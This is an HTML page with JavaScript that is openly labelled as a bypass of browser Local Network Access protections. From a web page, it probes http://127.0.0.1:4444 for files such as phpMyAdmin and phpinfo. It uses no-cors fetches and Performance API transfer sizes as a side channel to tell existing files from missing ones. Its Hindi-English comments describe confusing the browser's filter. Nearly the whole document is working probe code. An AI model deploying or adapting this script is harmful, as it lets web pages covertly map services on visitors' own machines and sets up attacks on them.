<!DOCTYPE html>
<html>
<head>
    <title>LNA Local-Pretense Auditor</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        .success { color: #00ff00; font-weight: bold; border-left: 3px solid #0f0; padding-left: 5px; }
        .notfound { color: #ff0055; font-weight: bold; }
        .console { border: 1px solid #0f0; padding: 15px; background: #050505; max-width: 800px; margin: auto; }
        button { background: #0f0; color: #000; border: none; padding: 12px; width: 100%; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

<div class="console">
    <h2>LNA BYPASS: LOCALHOST PREVENT PRIVILEGE</h2>
    <p>Mimicking Local-Origin behavior to extract precise Transferred Size metadata.</p>
    <button onclick="runLocalPretenseAudit()">EXECUTE LOCAL PREV SCAN</button>
    <div id="display" style="margin-top:20px;"></div>
</div>

<script>
    const targetPaths = [
        "/favicon.ico", 
        "/dashboard/phpinfo.php", 
        "/phpmyadmin/index.php", 
        "/icons/apache_pb.gif",
        "/wrong_file_test_" + Math.random().toString(36).substring(7)
    ];

    async function probeWithPretense(url) {
        try {
            // Hum fetch ko 'no-cors' aur custom cache settings ke sath bhej rahe hain
            // taaki browser filter ko confusion ho ki ye local resource hai ya public.
            await fetch(url, { 
                mode: 'no-cors', 
                cache: 'force-cache', // Trying to trigger local cache lookup logic
                credentials: 'omit' 
            });

            await new Promise(r => setTimeout(r, 400));
            
            // Performance API se 'Transferred Size' nikalna hi asli jackpot hai
            const entry = performance.getEntriesByName(url).pop();
            
            if (entry) {
                const size = entry.transferSize || entry.encodedBodySize || 0;
                
                // 404 page ka signature: ~537B
                // Asali files: > 4kB ya 80kB
                if (size > 600) {
                    return { status: "200 OK (Local Pretense)", size: (size/1024).toFixed(2) + " KB" };
                } else if (size > 0) {
                    return { status: "404 Not Found", size: size + " B" };
                }
            }
            return { status: "Blocked/Silent Drop", size: "0 B" };
        } catch (e) {
            return { status: "Security Alert Triggered", size: "N/A" };
        }
    }

    async function runLocalPretenseAudit() {
        const display = document.getElementById('display');
        const port = 4444; 
        display.innerHTML = `[!] Initiating Local Pretense Audit on 127.0.0.1:${port}...<br><br>`;

        for (let path of targetPaths) {
            const url = `http://127.0.0.1:${port}${path}`;
            const res = await probeWithPretense(url);
            
            let statusClass = (res.status.includes("200")) ? "success" : "notfound";
            display.innerHTML += `<div>Path: ${path} -> <span class="${statusClass}">${res.status} (${res.size})</span></div>`;
        }
    }
</script>
</body>
</html>
